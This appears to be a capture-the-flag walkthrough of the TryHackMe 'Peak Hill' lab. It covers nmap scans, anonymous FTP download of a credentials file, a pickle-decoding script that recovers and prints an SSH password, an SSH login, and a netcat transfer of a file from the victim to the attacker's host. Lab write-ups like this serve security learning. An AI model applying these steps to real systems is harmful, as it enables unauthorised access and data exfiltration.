# Peak Hill

**Room Link:** [**https://tryhackme.com/room/peakhill**](https://tryhackme.com/room/peakhill)



## **Scans**

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (775).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (777).png" alt=""><figcaption></figcaption></figure>

## TCP/21 - **FTP**

**Kali**

```
ftp $VICTIM 21
username: anonymous
```

There was just one file with no info.

**Kali(ftp)**

```
ls -lah
binary
passive
get test.txt
get .creds
```

<figure><img src="../../.gitbook/assets/image (776).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (778).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (779).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (781).png" alt=""><figcaption></figcaption></figure>

#### Decrypt Program

#### read.py

```
import pickle

with open("download.dat", "rb") as file:
	pickle_data = file.read()
	creds = pickle.loads(pickle_data)
	print(creds)
```

**Kali**

```
python read.py
```

<figure><img src="../../.gitbook/assets/image (782).png" alt=""><figcaption></figcaption></figure>

**output.txt**

```
[('ssh_pass15', 'u'), ('ssh_user1', 'h'), ('ssh_pass25', 'r'), ('ssh_pass20', 'h'), ('ssh_pass7', '_'), ('ssh_user0', 'g'), ('ssh_pass26', 'l'), ('ssh_pass5', '3'), ('ssh_pass1', '1'), ('ssh_pass22', '_'), ('ssh_pass12', '@'), ('ssh_user2', 'e'), ('ssh_user5', 'i'), ('ssh_pass18', '_'), ('ssh_pass27', 'd'), ('ssh_pass3', 'k'), ('ssh_pass19', 't'), ('ssh_pass6', 's'), ('ssh_pass9', '1'), ('ssh_pass23', 'w'), ('ssh_pass21', '3'), ('ssh_pass4', 'l'), ('ssh_pass14', '0'), ('ssh_user6', 'n'), ('ssh_pass2', 'c'), ('ssh_pass13', 'r'), ('ssh_pass16', 'n'), ('ssh_pass8', '@'), ('ssh_pass17', 'd'), ('ssh_pass24', '0'), ('ssh_user3', 'r'), ('ssh_user4', 'k'), ('ssh_pass11', '_'), ('ssh_pass0', 'p'), ('ssh_pass10', '1')]
```



**Kali**

```
cat output.txt | sed "s/), (/)\n/g" | grep ssh_user
```

<figure><img src="../../.gitbook/assets/image (783).png" alt=""><figcaption></figcaption></figure>

**Username**

```
gherkin
```

**Kali**

```
cat output.txt | sed "s/), (/)\n/g" | grep ssh_pass
```

<figure><img src="../../.gitbook/assets/image (784).png" alt=""><figcaption></figcaption></figure>

**Password**

```
p1ckl3s_@11_@r0und_th3_w0rld
```



## TCP/22 - **SSH**

**Kali**

```
ssh gherkin@$VICTIM
Password:p1ckl3s_@11_@r0und_th3_w0rld
```

<figure><img src="../../.gitbook/assets/image (785).png" alt=""><figcaption></figcaption></figure>





## Netcat

**Kali(receiving)**

```
nc -l -p 1234 > cmd_service.pyc
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < cmd_service.pyc
```































